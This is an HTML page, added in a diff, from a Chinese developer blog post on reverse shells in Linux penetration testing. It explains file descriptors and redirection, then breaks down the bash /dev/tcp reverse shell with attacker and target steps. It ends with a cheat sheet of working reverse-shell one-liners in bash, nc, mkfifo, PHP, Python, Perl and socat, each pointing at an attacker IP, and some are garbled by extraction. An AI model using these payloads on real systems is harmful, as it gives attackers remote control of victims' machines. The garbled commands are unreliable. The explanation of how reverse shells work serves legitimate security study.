@@ -1,0 +1,486 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>渗透测试中Linux下反弹shell的认识 | 开发者问答集锦</title>
+    <meta property="og:title" content="渗透测试中Linux下反弹shell的认识 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="渗透测试中Linux下反弹shell的认识">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADlinux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AE%A4%E8%AF%86/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">渗透测试中Linux下反弹shell的认识</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<p><strong>最近老是觉得自己白天工作累，晚上理应休息 堕落了几天才发觉自己真垃圾，加紧向前吧。</strong></p>
+
+<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>在平时渗透还是工作中经常会遇到shell反弹的情况，网上一搜反弹shell都是一大堆，但是真正遇到反弹shell的时候你真的懂了反弹shell</p>
+
+<p>的payload 的? 这篇会细致总结下常见反弹shell的情况(Linux)和反弹shell的本质。</p>
+
+<h2 id="0x01-linux的文件描述符">0x01 Linux的文件描述符</h2>
+
+<p><strong>linux文件描述符</strong>
+：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p>
+
+<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
+
+<p>标准输入standard input 0 （默认设备键盘）<br />
+标准输出standard output 1（默认设备显示器）<br />
+错误输出：error output 2（默认设备显示器）</p>
+
+<p>下面引用先知社区对文件描述符的脑图，非常清晰</p>
+
+<p><a href="https://img.it610.com/image/info8/dc058e431eed42b7bf5dbd7c02646ba5.jpg"><img src="https://img.it610.com/image/info8/dc058e431eed42b7bf5dbd7c02646ba5.jpg" alt="渗透测试中Linux下反弹shell的认识_第1张图片" /></a></p>
+
+<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
+
+<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的
+0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
+
+<p>（1）输入重定向 &lt; &lt;&lt;<br />
+（2）输出重定向 &gt; &gt;&gt;</p>
+
+<p>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的：</p>
+
+<pre><code>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。
+当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符
+</code></pre>
+
+<h2 id="0x02-linux-bash反弹shell解析">0x02 Linux bash反弹shell解析</h2>
+
+<h3 id="ps-反弹shell的原因-这里提一下">ps：反弹shell的原因 ，这里提一下</h3>
+
+<p>通常是因为网络环境(内网下断机器)、防火墙受限(限制入站规则)、权限维持(目标会更换域名、ip等)等等原因。</p>
+
+<h5 id="bash反弹">bash反弹</h5>
+
+<pre><code>bash -i &gt;&amp;/dev/tcp/192.168.5.3/6666 0&gt;&amp;1
+</code></pre>
+
+<p>一个个解析</p>
+
+<p>bash -i 产生一个交互式bash，bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如
+sh、zsh、等，他们之间有着细小差别），-i 这个参数表示的是产生交互式的shell</p>
+
+<blockquote>
+<p>&amp; /dev/tcp/ip/port 建立TCP连接，并将标准输出和错误重定向到TCP连接，/dev/tcp|udp/ip/port
+这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。</p>
+</blockquote>
+
+<p>0&gt;&amp;1 从TCP连接获取输入</p>
+
+<p><strong>为了更好理解</strong></p>
+
+<p>这里我们也做个试验</p>
+
+<p>这里我们把bash的内容标准输出和标准错误输出都重定向到192.168.190.<sup>138</sup>&frasl;<sub>6666</sub></p>
+
+<p>攻击机nc监听:</p>
+
+<pre><code>nc -lvp 6666
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/e01f8310103947749a64117e95627059.jpg"><img src="https://img.it610.com/image/info8/e01f8310103947749a64117e95627059.jpg" alt="" /></a></p>
+
+<p>目标机bash反弹</p>
+
+<pre><code>bash -i &gt;&amp;/dev/tcp/192.168.5.3/6666 
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/6bd8fbbfca8c4488b7d0fa9f65eb1d8b.jpg"><img src="https://img.it610.com/image/info8/6bd8fbbfca8c4488b7d0fa9f65eb1d8b.jpg" alt="" /></a></p>
+
+<p>因为这里目标机把bash的输出重定向到攻击机的6666端口，所以任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。</p>
+
+<p><a href="https://img.it610.com/image/info8/e060c6f6d77b4b138aad9896a20b5173.jpg"><img src="https://img.it610.com/image/info8/e060c6f6d77b4b138aad9896a20b5173.jpg" alt="渗透测试中Linux下反弹shell的认识_第2张图片" /></a></p>
+
+<p>我们再来试验一下</p>
+
+<p>攻击机还是nc监听 这次目标机器执行</p>
+
+<pre><code>bash -i &lt; /dev/tcp/192.168.5.3/6666
+</code></pre>
+
+<p>这是把/dev/tcp/192.168.5.3/6666的标准输入重定向到目标机的bash</p>
+
+<p>这条指令的意思是将攻击者输入的命令输入给受害者的bash，自然就能执行了</p>
+
+<p><a href="https://img.it610.com/image/info8/55a19ef694284fc5be49f28e433b0d80.jpg"><img src="https://img.it610.com/image/info8/55a19ef694284fc5be49f28e433b0d80.jpg" alt="渗透测试中Linux下反弹shell的认识_第3张图片" /></a></p>
+
+<p>攻击机执行whoami</p>
+
+<p><a href="https://img.it610.com/image/info8/d91cba801daf41ca83d6a7941f767829.jpg"><img src="https://img.it610.com/image/info8/d91cba801daf41ca83d6a7941f767829.jpg" alt="渗透测试中Linux下反弹shell的认识_第4张图片" /></a></p>
+
+<p>而回显 也就是目标机的输出还是在目标机的本机</p>
+
+<p><a href="https://img.it610.com/image/info8/eb820d4e59e54c4a8da5dae9bb4587a6.jpg"><img src="https://img.it610.com/image/info8/eb820d4e59e54c4a8da5dae9bb4587a6.jpg" alt="渗透测试中Linux下反弹shell的认识_第5张图片" /></a></p>
+
+<p>ok这里就很清楚了输出输入的重定向了</p>
+
+<p>bash反弹也就是结合上面两条命令:</p>
+
+<pre><code>bash -i &gt; /dev/tcp/192.168.5.3/6666 0&gt;&amp;1
+</code></pre>
+
+<p><strong>输入0是由/dev/tcp/192.168.5.<sup>3</sup>&frasl;<sub>6666</sub>
+输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.5.3/6666上，这就形成了一个回路，实现了我们远程交互式shell
+的功能</strong></p>
+
+<p><img src="https://img.it610.com/image/info8/5c57b5d9259c4bd2b53f2ef69cfabc54.jpg" alt="" /></p>
+
+<p><a href="https://img.it610.com/image/info8/3cca5dd8dac740c59b2ed5c51a409f47.jpg"><img src="https://img.it610.com/image/info8/3cca5dd8dac740c59b2ed5c51a409f47.jpg" alt="渗透测试中Linux下反弹shell的认识_第6张图片" /></a></p>
+
+<p>这时候我们的输入还是会在目标机 这时候我们多加一条<code>2&gt;&amp;1 标准错误输入重定向到&amp;1标准输入，也就是我们攻击机的6666端口</code></p>
+
+<pre><code>bash -i &gt; /dev/tcp/192.168.5.3/6666 0&gt;&amp;1 2&gt;&amp;1
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/15ba4d67e4e346088c327126178850b1.jpg"><img src="https://img.it610.com/image/info8/15ba4d67e4e346088c327126178850b1.jpg" alt="渗透测试中Linux下反弹shell的认识_第7张图片" /></a></p>
+
+<p>这时候目标机就没有输入的输出了</p>
+
+<p><a href="https://img.it610.com/image/info8/6194a222e1b44e53b856475be4ca41ae.jpg"><img src="https://img.it610.com/image/info8/6194a222e1b44e53b856475be4ca41ae.jpg" alt="渗透测试中Linux下反弹shell的认识_第8张图片" /></a></p>
+
+<h2 id="0x03-常见反弹shell形式">0x03 常见反弹shell形式</h2>
+
+<h5 id="bash反弹-1">bash反弹</h5>
+
+<pre><code>bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1
+
+
+bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 01
+</code></pre>
+
+<p>这里的唯一区别就是 0&gt;&amp;1 和 0</p>
+
+<h5 id="exec绑定反弹">exec绑定反弹</h5>
+
+<pre><code>exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat 5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done
+
+
+0196;exec 196&lt;&gt;/dev/tcp/192.168.5.3/6666; sh 196 &gt;&amp;196 2&gt;&amp;196
+</code></pre>
+
+<h5 id="nc反弹">nc反弹</h5>
+
+<p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p>
+
+<pre><code>nc -e /bin/sh 192.168.146.129 2333
+</code></pre>
+
+<p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p>
+
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f
+</code></pre>
+
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc
+传到该管道，由此形成了一个回路</p>
+
+<p>类似的命令：</p>
+
+<pre><code>mknod backpipe p; nc 192.168.146.129 2333 01&gt;backpipe 2&gt;backpipe
+</code></pre>
+
+<p>如果觉得很复杂 nc就算没有-e也可以利用管道符直接反弹</p>
+
+<pre><code>nc -nvlp 6666
+
+nc -nvlp 7777
+</code></pre>
+
+<p>连接</p>
+
+<pre><code>nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777
+</code></pre>
+
+<h5 id="php反弹shell">php反弹shell</h5>
+
+<p>使用php的exec函数执行方法1反弹shell的命令：</p>
+
+<pre><code>php- 'exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777&quot;)'
+</code></pre>
+
+<p>也可以使用php建立socket会话:</p>
+
+<pre><code>php -r '$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/bash -i &amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+
+<p>反向连接</p>
+
+<pre><code>php -r '$sock=fsockopen(&quot;192.168.0.4&quot;,7777);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+
+<h5 id="python">python:</h5>
+
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.21.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+
+<h5 id="perl">perl:</h5>
+
+<pre><code>perl -e 'use Socket;$i=&quot;192.168.21.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+
+<h5 id="socat">socat:</h5>
+
+<pre><code>socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:192.168.21.1:8080
+
+
+
+
+
+根据不用场景利用可利用的资源进行反弹  
+</code></pre>
+
+<p>#####</p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
